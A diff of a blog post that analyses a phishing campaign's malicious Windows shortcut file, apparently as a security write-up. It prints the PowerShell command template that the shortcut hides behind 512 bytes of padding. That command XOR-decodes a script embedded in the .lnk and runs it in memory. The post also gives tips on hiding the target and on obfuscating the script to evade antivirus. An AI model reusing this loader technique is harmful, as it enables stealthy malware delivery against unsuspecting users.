@@ -257,6 +257,7 @@ Target for Send to OneNote.lnk:
 __And again another next startup:__
 
 ![Startup](/assets/posts/2024-07-14-phishing-is-real/last_startup.png)
+_After extract a.rar_
 
 You should see another shortcut file. (__Microsoft OneDrive__) If you run this lnk file directly, there's no problem. Antivirus software does not catch it. But if you download a rar file with the 'Microsoft OneDrive.lnk' file directly embedded, antivirus software will detect it. 
 
@@ -272,27 +273,37 @@ Now, Do you understand why it is embedded with a password, why used cabinet file
 
 ![Shortcut](/assets/posts/2024-07-14-phishing-is-real/last_shortcut.png)
 
-As you can see, The target can't see it. Because it's overflowed with 512 bytes as space. Or, you can apply other trick. 
+As you can see, The target can't see it. Because it's overflowed with 512 bytes as space.
+
+&nbsp;
 
 > Did you also know that you can completely hide the target part on the GUI without using overflow? I highly recommend reviewing the documentation I provided below that shows the structure of lnk files.
 {: .prompt-tip}
 
+&nbsp;
 
 - [Github - LNK Doc](https://github.com/libyal/liblnk/blob/main/documentation/Windows%20Shortcut%20File%20(LNK)%20format.asciidoc)
 - [Microsoft - LNK Doc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/747629b3-b5be-452a-8101-b9a2ec49978c)
 
+&nbsp;
 
 ```console
 %512S/c powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq 0x00000000} ^| Select-Object -ExpandProperty Name; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x%02X }; $c=([byte[]]($file ^| select -Skip 000000));[System.Text.Encoding]::UTF8.GetString($c) ^| iex
 ```
 
+&nbsp;
+
 > If you look at line 126 in the source code, you will see that first, the lnk file identifies itself by its length. Then, it takes itself as bytes and finally performs dexoring. Lastly, without writing to the disk or accessing the internet, it executes PowerShell code in memory.
 {: .prompt-info }
 
-![Hexeditor](/assets/posts/2024-07-14-phishing-is-real/hexeditor.png)
+&nbsp;
 
 >If you open "Microsoft OneDrive.lnk" file with hexeditor, you will see PS Code at 0xB04 offset. The x86matthew's script does exactly this. First, it's finding itself and extracting or running PS code in memory. This script can be encoded with [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) or [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) or you can embed it as zip :).
 {: .prompt-tip}
+
+&nbsp;
+
+![Hexeditor](/assets/posts/2024-07-14-phishing-is-real/hexeditor.png)
 
 You can review all the code below. Thanks to [x86matthew - source code](https://web.archive.org/web/20240119020949/https://www.x86matthew.com/view_post?id=embed_exe_lnk)
 
